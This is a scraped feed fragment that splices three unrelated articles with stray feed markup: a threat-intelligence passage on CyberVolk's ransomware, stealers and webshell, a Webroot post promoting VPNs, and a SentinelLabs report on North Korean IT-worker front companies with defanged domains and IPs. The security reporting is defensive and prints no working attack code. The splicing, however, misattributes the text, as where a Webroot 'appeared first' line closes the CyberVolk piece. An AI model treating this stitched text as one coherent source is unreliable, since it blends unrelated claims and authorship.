&lt;p&gt;HexaLocker is a ransomware family that first appeared in July 2024. HexaLocker is closely associated with &lt;a href="https://www.sentinelone.com/blog/lapsus-data-breach/" rel="noopener noreferrer" target="_blank"&gt;LAPSUS$&lt;/a&gt;, reportedly having been originally developed by “ZZART3XX”, a proclaimed former associate of the group. HexaLocker payloads are written in &lt;a href="https://www.sentinelone.com/labs/alphagolang-a-step-by-step-go-malware-reversing-methodology-for-ida-pro/" rel="noopener noreferrer" target="_blank"&gt;Golang&lt;/a&gt;. As of this writing, we have only observed payloads targeting Windows systems.&lt;/p&gt;
&lt;p&gt;On July 22, CyberVolk first referenced HexaLocker via one of Holy League’s posts. The Holy League is a loosely affiliated group of 70+ members born out of protest against Spain and &lt;a href="https://www.reuters.com/technology/cybersecurity/three-pro-russian-hackers-arrested-spain-over-cyberattacks-2024-07-20/" rel="noopener noreferrer" target="_blank"&gt;associated arrests&lt;/a&gt; of members of &lt;a href="https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/" rel="noopener noreferrer" target="_blank"&gt;NONAME057(16)&lt;/a&gt;. HexaLocker’s posts and branding are all laden with their “Lock. Demand. Dominate” slogan.&lt;/p&gt;
&lt;p&gt;In September 2024, HexaLocker launched a new Telegram channel after previous ones had been banned or removed. The updated channel contains details on their ongoing existence along with screenshots of the current HexaLocker panel.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109306" style="width: 869px;"&gt;&lt;img alt="HexaLocker Telegram message" class="size-full wp-image-109306" height="295" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_44.jpg" width="869" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109306"&gt;HexaLocker Telegram message&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Throughout October 2024, CyberVolk’s communication channels continued to echo messaging from HexaLocker. This includes HexaLocker’s solicitations for help in continuing to progress with HexaLocker. On October 2, 2024, HexaLocker posted an update asking for help but also teasing new features in the pipeline. These include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Stronger anti-debug/anti-analysis features&lt;/li&gt;
&lt;li&gt;Advanced obfuscations (crypting/packing)&lt;/li&gt;
&lt;li&gt;Inclusion of EDR/XDR/AV-Killer&lt;/li&gt;
&lt;li&gt;Permanent AMSI bypass&lt;/li&gt;
&lt;li&gt;Improved process-injection&lt;/li&gt;
&lt;li&gt;Remote Thread Hijacking&lt;/li&gt;
&lt;li&gt;UAC Bypass improvements&lt;/li&gt;
&lt;li&gt;Self-deletion&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Interesting developments continued with HexaLocker throughout October 2024. On October 4th, the group posted an update with a video demo claiming that an “EDR Killer” and AMSI/WD Bypass features had been added. This was followed on October 6th with an update stating that UAC bypasses had been added to the product.&lt;/p&gt;
&lt;p&gt;On October 20, 2024, the actor behind the HexaLocker Telegram channel (ZZART3XX) posted their intention to officially leave and denounce LAPSUS$ as well as any peripheral affiliations. This includes the maintenance of the HexaLocker project and all the relationships and alliances that revolve around it.&lt;/p&gt;
&lt;p&gt;In this announcement, the author also indicated that they would be offering HexaLocker source code, including its web panel, along with “LAPSUS$ Ransomware” source for sale.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109320" style="width: 500px;"&gt;&lt;img alt="HexaLocker “shut down” posting via Telegram" class="size-full wp-image-109320" height="487" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31.jpg" width="500" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109320"&gt;HexaLocker “shut down” posting via Telegram&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This was followed the next day on October 21 with offers to sell HexaLocker and the panel infrastructure, along with associated “LAPSUS$ Ransomware”. These messages were echoed across HexaLocker, Holy League, and LAPSUS$-aligned channels.&lt;/p&gt;
&lt;p&gt;The overt promotion of HexaLocker within CyberVolk channels has ceased since the HexaLocker shutdown announcement.&lt;/p&gt;
&lt;h2&gt;Parano Ransomware Within the CyberVolk Collective&lt;/h2&gt;
&lt;p&gt;In late October 2024, various identities in the CyberVolk community began promoting the release of Parano Ransomware v1. This appears to be another affiliation for the CyberVolk collective.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109353" style="width: 617px;"&gt;&lt;img alt="October 2024 Parano Ransomware Announcement by CyberVolk" class="size-full wp-image-109353" height="528" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_15.jpg" width="617" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109353"&gt;October 2024 Parano Ransomware Announcement by CyberVolk&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;According to the announcement, Parano Ransomware comes with a $400.00 USD price tag per single payload/stub. The ransomware features strong anti-analysis and anti-debugging features, and uses a combination of AES-128 and RSA-4096 for key management. &lt;/p&gt;
&lt;p&gt;The Parano malware family extends beyond ransomware, also including “Parano Checker” and &amp;#8220;Parano Stealer”, a commodity, Python-based, infostealer. The malware attempts to gather and exfiltrate browser data, Discord details, crypto wallet information and keys, along with other related software and system diagnostic details. The data can be exfiltrated via Discord webhook to a channel or location of the attacker&amp;#8217;s choosing.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109355" style="width: 516px;"&gt;&lt;img alt="Parano Stealer Announcement, October 2024" class="size-full wp-image-109355" height="475" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_35.jpg" width="516" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109355"&gt;Parano Stealer Announcement, October 2024&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Parano Checker is a reconnaissance and info-gathering tool capable of navigating targets and helping to isolate interesting ingress points or data repositories, or assist with dictionary/brute force attacks on certain interfaces (e.g., CPanel and WordPress login panels).&lt;/p&gt;
&lt;p&gt;At the time of writing, we have not observed the executable variations of Parano (&lt;i&gt;aka&lt;/i&gt; Paraodeus Ransomware) in the wild. The author has shared a non-malicious Python-based demo of a “ScreenLocker”. As it stands, the nature of the relationship between CyberVolk and the Parano ecosystem is still evolving.&lt;/p&gt;
&lt;h2&gt;Beyond Ransomware | CyberVolk Stealers and Webshells&lt;/h2&gt;
&lt;p&gt;In addition to ransomware and other disruptive attacks, CyberVolk develops and distributes infostealer malware and webshells. The group announced the new webshell in late October 2024.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109318" style="width: 469px;"&gt;&lt;img alt="CyberVolk Webshell announcement (Telegram)" class="size-full wp-image-109318" height="552" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_33.jpg" width="469" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109318"&gt;CyberVolk Webshell announcement (Telegram)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The CyberVolk webshell is distributed as a standard PHP file with the actual malicious code base64-encoded inside its body.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109325" style="width: 981px;"&gt;&lt;img alt="CyberVolk Webshell decoded" class="size-full wp-image-109325" height="545" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_27.jpg" width="981" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109325"&gt;CyberVolk Webshell decoded&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The publicly &lt;a href="https://x.com/FalconFeedsio/status/1838244850669392307/photo/1" rel="noopener noreferrer" target="_blank"&gt;released&lt;/a&gt; version of the CyberVolk webshell provides multiple functions. The current version of the webshell allows for files to be uploaded, renamed, and downloaded. Further, attackers can traverse directories on the target server and gather environmental details.&lt;/p&gt;
&lt;p&gt;“CyberVolk Stealer” is distributed in the form of a Python script and is based on LBX-Grabber, an existing Python information stealer, which is in turn built into &lt;a href="https://www.cyfirma.com/research/blx-stealer/" rel="noopener noreferrer" target="_blank"&gt;BLX-Stealer&lt;/a&gt;. Specifically, CyberVolk is derived from the LBX-Grabber component.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109309" style="width: 1764px;"&gt;&lt;img alt="CyberVolk Stealer Python Script" class="size-full wp-image-109309" height="1034" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_41.jpg" width="1764" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109309"&gt;CyberVolk Stealer Python Script&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;CyberVolk Stealer attempts to gather various types of data from the system, then exfiltrates the data via Discord. Version 1 of the stealer was announced in September 2024. Core features include robust gathering of browser, discord, game and crypto wallet data. The stealer targets multiple browsers and numerous wallets.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109304" style="width: 663px;"&gt;&lt;img alt="CyberVolk Stealer identifying sensitive data" class="size-full wp-image-109304" height="533" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_6.jpg" width="663" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109304"&gt;CyberVolk Stealer identifying sensitive data&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Telegram Exit and Weaponized Bans&lt;/h2&gt;
&lt;p&gt;In early November 2024, CyberVolk, and numerous affiliated groups, vanished from Telegram as a result of a mass ban of hacktivist groups. The last significant posts to the CyberVolk Telegram channels were on November 3, 2024.&lt;/p&gt;
&lt;p&gt;The group subsequently announced, via Twitter/X, that it would only be using the X platform going forward. The Twitter/X account for DoubleFace, &lt;code&gt;@DoubleFace_Team&lt;/code&gt;, made a similar announcement around the same time.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109322" style="width: 1260px;"&gt;&lt;img alt="Telegram ban updates on X" class="size-full wp-image-109322" height="346" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_3.jpg" width="1260" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109322"&gt;Telegram ban updates on X&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Telegram channels belonging to CyberVolk and numerous allies appear to have been banned maliciously. We have observed specific actors claiming responsibility for attempting to close and/or extort channels belonging to AzzaSec and DoubleFace amongst others.&lt;/p&gt;
&lt;p&gt;In September, some users began threatening to have rival hacktivist group channels including CyberVolk, APTZone, Doubleface, AzzaSec and others banned.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109341" style="width: 1586px;"&gt;&lt;img alt="September 14, 2024 - “Matteo” targeting CyberVolk/APTZone with bans" class="size-full wp-image-109341" height="886" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_12.jpg" width="1586" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109341"&gt;September 14, 2024 &amp;#8211; “Matteo” targeting CyberVolk/APTZone with bans&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;On November 16, 2024, RipperSec posted their ‘perspective’ on the banning of multiple hacktivist channels, indicating that some prior members of AzzaSec and Doubleface were attempting to exhort other channels under the threat of a Telegram ban.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109334" style="width: 675px;"&gt;&lt;img alt="November 13, 2024 RipperSec Telegram Post" class="size-full wp-image-109334" height="294" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_19.jpg" width="675" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109334"&gt;November 13, 2024 RipperSec Telegram Post&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This was highlighted in another post on November 13, 2024 in the “Hunt3r Kill3rs” Telegram channel. In this post, an actor referring to AzzaSec claimed “they didn’t close nobody’s channels, all the channels got closed by me”. The post went on to advise others receiving extortion threats to ignore them. “I’m the only one that is closing the hacktivist community’s channels and groups”, the actor claimed.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109333" style="width: 529px;"&gt;&lt;img alt="November 13, 2024 posting in Hunt3r Kill3rs Telegram Channel" class="size-full wp-image-109333" height="324" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_2.jpg" width="529" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109333"&gt;November 13, 2024 posting in Hunt3r Kill3rs Telegram Channel&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This weaponization of the Telegram &lt;a href="https://securityintelligence.com/articles/what-telegrams-recent-policy-shift-means-for-cyber-crime/" rel="noopener noreferrer" target="_blank"&gt;Terms-of-Service&lt;/a&gt; is increasing in parallel with threat actor groups moving off Telegram to seek more clandestine and secure communication channels in response to increased &lt;a href="https://apnews.com/article/telegram-pavel-durov-arrest-2c8015c102cce23c23d55c6ca82641c5" rel="noopener noreferrer" target="_blank"&gt;scrutiny&lt;/a&gt; and declining trust in the platform after the arrest of Telegram founder Pavel Durov.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The number of ransomware families associated with the CyberVolk hacktivist group highlights the ability of this group to rapidly pivot, building upon existing tools to suit their needs and further their causes. Though primarily composed of lower-skilled threat actors that reach for and use whatever works for them, we continue to see how quickly the group is able to move and adapt.&lt;/p&gt;
&lt;p&gt;The reuse of tools like AzzaSec Ransom, Diamond RW, and even more established ones like LockBit and Chaos, demonstrates just how dynamic these affiliations and alliances between hacktivist groups can be. Not only are such groups touting new tools within short time frames only to abandon them and pivot to something else later, the number of hacktivist groups is also growing. Infighting and tensions amongst them are also fuel for the rates of growth and change &amp;#8211; as alliances crumble or shift, the threat environment stays highly volatile and dynamic, making it more difficult for cyber defenders to track their activities consistently.&lt;/p&gt;
&lt;p&gt;As groups like CyberVolk leverage openly-available commodity tools with high potential for causing damage, they continue to add more layers of complexity, expanding and revising the tools as they are passed around within the collective. Ransomware operations will only get muddier and increase how much cybersecurity teams will need to monitor in order to stay up to date on the happenings within the cybercrime ecosystem.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2024/11/21/do-you-actually-need-a-vpn-your-guide-to-staying-safe-online/" rel="nofollow"&gt;Do you actually need a VPN? Your guide to staying safe online!&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;With the rise of online scams and privacy risks, &lt;a href="https://www.webroot.com/blog/2022/01/25/the-benefits-of-using-a-vpn-on-your-home-network/"&gt;virtual private networks (VPNs)&lt;/a&gt; are becoming more popular for day-to-day use. Or at least I feel like they are based on the number of ads I hear for them on my favorite podcasts.&lt;/p&gt;



&lt;p&gt;So maybe you’ve heard of VPNs but aren’t actually sure what they are. Simply put, a VPN creates a safe, anonymous pathway for the data you send and receive over a Wi-Fi network, allowing you to browse anonymously and access content as if you were in a different location.&lt;/p&gt;



&lt;p&gt;Maybe you’ve used VPNs as a remote worker to access resources and applications for your job, or as a student to connect to your university network. Do you really need a VPN for personal use? The short answer—absolutely! Keep reading for the long answer and for tips on choosing the right VPN.&lt;/p&gt;



&lt;h2&gt;How do VPNs work?&lt;/h2&gt;



&lt;p&gt;Essentially, VPNs create a secure tunnel for your data. The five core components of a VPN are:&lt;/p&gt;



&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-encryption"&gt;Encryption&lt;/a&gt;:&lt;/strong&gt; The conversion of information into a coded format that can only be read by someone who has the decryption key. It ensures that data remains secure and private during transmission or storage.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;VPN servers:&lt;/strong&gt; Usually located all over the world, VPN servers act as intermediaries between your device and the internet and maintain your privacy by masking your IP address and location.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Kill switch:&lt;/strong&gt; Blocks your device’s internet access if the VPN connection drops. This way, the VPN app makes sure you’re always protected.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Split tunneling:&lt;/strong&gt; Allows you to choose which internet traffic goes through the VPN (with encryption) and which goes directly to the internet.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;VPN protocols:&lt;/strong&gt; Transmits your data according to protocols like OpenVPN, IKEv2, and WireGuard. Each cover different use cases like streaming or gaming or are required for certain types of devices.&lt;/li&gt;
&lt;/ol&gt;



&lt;h2&gt;Why use a VPN?&lt;/h2&gt;



&lt;p&gt;Maybe you already have other personal cybersecurity tools for personal user and think you don’t need a VPN. Consider the following and see if you still feel that way:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Privacy protection&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Because a VPN creates a secure tunnel for your data, you don’t have to worry about bad actors peeping in on your activity and private information. This is especially important when using public Wi-Fi at coffee shops, airports, malls or hotels, where hackers can easily overcome public Wi-Fi security protocols to gain access to your device.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Antivirus augmentation&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Even if you already have antivirus software, using a VPN enhances your personal cybersecurity.&lt;br /&gt;Personal privacy:&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Antivirus software: &lt;/strong&gt;Primarily protects your device from malware, viruses, and other malicious software.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;VPN: &lt;/strong&gt;Encrypts your internet connection, hiding your online activities from ISPs, hackers, and even government surveillance. Keeps your browsing history and personal data private and anonymous.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Secure public Wi-Fi use:&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Antivirus software: &lt;/strong&gt;Can detect and block malicious files or websites, but it doesn’t secure your internet connection.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;VPN: &lt;/strong&gt;Protects your data on public Wi-Fi networks, which are often unsecured and a hotspot for hackers. A VPN encrypts your connection, making it much harder for anyone to intercept your data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Accessing restricted content&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I have a friend who loves British television but can’t always access it due to living in America. So she uses a VPN to set the United Kingdom as her virtual location and then watches all the BBC murder mysteries she wants.&lt;/p&gt;



&lt;p&gt;This capability is extremely useful if you’re someone who travels a lot. For example, if you find yourself in a country with strict censorship laws, a VPN can help you access your usual content—even if it is restricted.&lt;/p&gt;



&lt;h2&gt;Which VPN should you choose?&lt;/h2&gt;



&lt;p&gt;Consider the following when researching VPNs:&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;Connection speed&lt;/li&gt;



&lt;li&gt;Unlimited data and bandwidth&lt;/li&gt;



&lt;li&gt;Number and location of servers across the globe&lt;/li&gt;



&lt;li&gt;No-log policy*&lt;/li&gt;



&lt;li&gt;Security features and protocols&lt;/li&gt;



&lt;li&gt;Ease of use&lt;/li&gt;



&lt;li&gt;Brand reputation and customer support&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;While some VPNs may be free, they often come with limited performance, data caps, and lower security and log standards.&lt;/p&gt;



&lt;h2&gt;What steps should you take next?&lt;/h2&gt;



&lt;p&gt;Cybersecurity is only going to get more important as technology—and cyberthreats—advance. To protect your private, sensitive data, you’ll need all the tools at your disposal to keep out criminals. Add a VPN such as &lt;a href="http://webroot.com/us/en/home/products/secure-vpn"&gt;Webroot&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/2122.png" style="height: 1em;" /&gt; Secure VPN&lt;/a&gt; to your arsenal of cybersecurity tools to browse the internet safely and privately.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*A no-log policy means that the provider doesn’t keep any records of your online activities, ensuring your privacy and anonymity. This policy protects you from tracking, reduces the risk of data breaches, and prevents third-party access to your information. It also builds trust and gives you peace of mind, knowing your online activities are not being recorded or shared.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SentinelLabs has identified unique characteristics of multiple websites, now seized by the US Government, associated with the DPRK IT Worker front companies.&lt;/li&gt;
&lt;li&gt;We assess with high confidence that DPRK actors seek to impersonate US based software and technology consulting businesses by copying the online brands of legitimate organizations, seeking to use these for financial objectives.&lt;/li&gt;
&lt;li&gt;SentinelLabs has linked the activity to several active front companies and links these with high confidence to a larger set of organizations being created in China.&lt;/li&gt;
&lt;li&gt;Our findings link additional companies, which remain active today, to the DPRK IT Workers scheme.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Background&lt;/h2&gt;
&lt;p&gt;North Korea operates a global network of IT workers, both as individuals and under front companies, to evade sanctions and generate revenue for the regime. These workers are highly skilled in areas like software development, mobile applications, blockchain, and cryptocurrency technologies. By posing as professionals from other countries using fake identities and forged credentials, they secure remote jobs and freelance contracts with businesses worldwide.&lt;/p&gt;
&lt;p&gt;Our PinnacleOne team has compiled an executive summary of this threat, &lt;a href="https://www.sentinelone.com/blog/pinnacleone-execbrief-north-korean-it-worker-threat/" rel="noopener noreferrer" target="_blank"&gt;available here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Front companies, often based in China, Russia, Southeast Asia, and Africa, play a key role in masking the workers’ true origins and managing payments. Notable examples include China-based Yanbian Silverstar Network Technology Co. Ltd., &lt;a href="https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-action-disrupt-illicit-revenue-generation" rel="noopener noreferrer" target="_blank"&gt;disrupted in October 2023&lt;/a&gt;, and Russia-based Volasys Silver Star, sanctioned by the U.S. Department of the Treasury &lt;a href="https://home.treasury.gov/news/press-releases/sm481" rel="noopener noreferrer" target="_blank"&gt;in 2018&lt;/a&gt;, for their roles in facilitating fraudulent IT operations. These entities helped DPRK workers launder earnings through online payment services and Chinese bank accounts. The payments, often routed through cryptocurrencies or shadow banking systems, ultimately support state programs, including weapons development, circumventing international sanctions.&lt;/p&gt;
&lt;p&gt;These schemes present significant risks to employers, including potential legal violations, reputational damage, and insider threats such as intellectual property theft or malware implantation. Addressing these risks requires heightened awareness and stringent vetting processes to limit North Korea’s ability to exploit global tech markets.&lt;/p&gt;
&lt;p&gt;This blog explores four newly identified examples of DPRK IT Worker front companies, analyzing their online presence and the methods they use to appear legitimate to unsuspecting targets in recent months. These four companies’ websites were recently subject to law enforcement action and taken offline.&lt;/p&gt;
&lt;h2&gt;Independent Lab LLC&lt;/h2&gt;
&lt;p&gt;The Independent Lab LLC website, &lt;code&gt;inditechlab[.]com&lt;/code&gt; was active since at least February 2024, with indication it was acquired and operated using InterServer hosting since May 2022 (&lt;code&gt;174.138.181[.]198&lt;/code&gt;). The domain itself was registered through NameCheap.&lt;/p&gt;
&lt;p&gt;The content of the website is in line with what you would expect of a legitimate software development outsourcing business, with no obvious major indicators associated with the DPRK, or even illegitimate in any way. In the case of Independent Lab LLC, the website format and content was copied from Kitrum, a legitimate custom software firm headquartered in the United States. The DPRK actors did not retain the “We Stand with Ukraine” link or menu header.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109246" style="width: 1412px;"&gt;&lt;img alt="DPRK IT Worker Front Company Website - Independent Lab LLC" class="size-full wp-image-109246" height="947" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_13.jpg" width="1412" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109246"&gt;DPRK IT Worker Front Company Website &amp;#8211; Independent Lab LLChot&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109244" style="width: 1391px;"&gt;&lt;img alt="Legitimate business, source of copied website design used by DPRK" class="size-full wp-image-109244" height="1034" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_15.jpg" width="1391" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109244"&gt;Legitimate business, source of copied website design used by DPRK&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The content of the website centered around the Contact Us form, enticing visitors to engage in communications, providing no contact details on the website itself.&lt;/p&gt;
&lt;h2&gt;Shenyang Tonywang Technology LTD&lt;/h2&gt;
&lt;p&gt;The name “Shenyang Tonywang Technology” was used in the formal content of the website; however, the domain itself is &lt;code&gt;tonywangtech[.]com&lt;/code&gt;. The website first became active in November 2023, overlapping with previously used InterServer hosting infrastructure (&lt;code&gt;174.138.181[.]198&lt;/code&gt;), and was also registered via NameCheap.&lt;/p&gt;
&lt;p&gt;Similar to the previous example, Shenyang Tonywang Technology advertises itself as a top software consulting company with bespoke solutions, including DevOps &amp;amp; cloud consulting. In this case, the website format and content was copied from Urolime, a legitimate DevOps consulting company headquartered in the United States.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109237" style="width: 1506px;"&gt;&lt;img alt="DPRK IT Worker Front Company Website - Shenyang Tonywang Technology LTD" class="size-full wp-image-109237" height="925" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_4.jpg" width="1506" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109237"&gt;DPRK IT Worker Front Company Website &amp;#8211; Shenyang Tonywang Technology LTD&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109235" style="width: 1344px;"&gt;&lt;img alt="Legitimate Urolime business, source of copied website design used by DPRK" class="size-full wp-image-109235" height="988" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_6.jpg" width="1344" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109235"&gt;Legitimate Urolime business, source of copied website design used by DPRK&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Tony WKJ LLC&lt;/h2&gt;
&lt;p&gt;Tony WKJ LLC IT Services website, &lt;code&gt;wkjllc[.]com&lt;/code&gt;, was active since at least May 2024, with indication it was acquired and operated using InterServer hosting (&lt;code&gt;174.138.181[.]198&lt;/code&gt;) since May 2022. The domain itself was registered through NameCheap.&lt;/p&gt;
&lt;p&gt;Tony WKJ LLC advertises itself as a leading software development company that specializes in Agile IT development. Once again, In this case the website format and content was copied from a legitimate business. Specifically, this website is a copy from  ArohaTech IT Services, a software and web development company headquartered in Noida, India.&lt;/p&gt;
&lt;p&gt;However, a comparison to the legitimate website reveals that the DPRK actors have not only placed their own name, and removed original ArohaTech logos, they have also modified the content to clearly attempt to brand Tony WKJ LLC as a US based company.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109234" style="width: 1392px;"&gt;&lt;img alt="DPRK IT Worker Front Company Website - Tony WKJ LLC" class="size-full wp-image-109234" height="1158" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_7.jpg" width="1392" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109234"&gt;DPRK IT Worker Front Company Website &amp;#8211; Tony WKJ LLC&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109241" style="width: 1390px;"&gt;&lt;img alt="Legitimate business, source of copied website design used by DPRK" class="size-full wp-image-109241" height="1259" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_18.jpg" width="1390" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109241"&gt;Legitimate business, source of copied website design used by DPRK&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;HopanaTech&lt;/h2&gt;
&lt;p&gt;HopanaTech website, &lt;code&gt;hopanatech[.]com&lt;/code&gt; is a bit more unique from the others above. The domain itself was first registered in November 2020, and began hosting publicly via Asia Web Services Ltd (&lt;code&gt;180.235.135[.]177&lt;/code&gt;) in December 2020. The website has been presented as shown below since at least the end of 2021. The domain was registered through NameCheap.&lt;/p&gt;
&lt;p&gt;The website content aligns with the previous examples, including the description of being a custom software development company. The HopanaTech version of the content has been modified significantly; however, it continued to make use of customer reviews and marketing content from legitimate public websites. However, in some cases, content that would have required more than a simple text edit remains unchanged, showing the original sources name, such as the legitimate ITechArt firm&amp;#8217;s website.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109236" style="width: 1527px;"&gt;&lt;img alt="DPRK IT Worker Front Company Website - HopanaTech" class="size-full wp-image-109236" height="1036" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_5.jpg" width="1527" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109236"&gt;DPRK IT Worker Front Company Website &amp;#8211; HopanaTech&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109239" style="width: 1999px;"&gt;&lt;img alt="DPRK IT Worker Front Company Website - HopanaTech - Showing content source" class="size-full wp-image-109239" height="1020" src="https://www.sentinelone.com/wp-content/uploads/2024/11/DPRK_IT_2.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109239"&gt;DPRK IT Worker Front Company Website &amp;#8211; HopanaTech &amp;#8211; Showing content source&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;United States Government Response&lt;/h2&gt;
&lt;p&gt;Each of the above four companies has been disrupted by US Government agencies, specifically the Department of Justice, Federal Bureau of Investigation, Homeland Security Investigations, Defense Criminal Investigative Service, and the United States Postal Inspection Service.&lt;/p&gt;
&lt;p&gt;On October 10th, the US Government seized the four domains belonging to the front companies, each of which now shows the standard takedown alert and links to &lt;a href="https://ofac.treasury.gov/media/923131/download?inline" rel="noopener noreferrer" target="_blank"&gt;the 2022 US Treasury fact sheet&lt;/a&gt; on DPRKs IT Worker scheme. The websites rotate between English and Korean language versions.&lt;/p&gt;
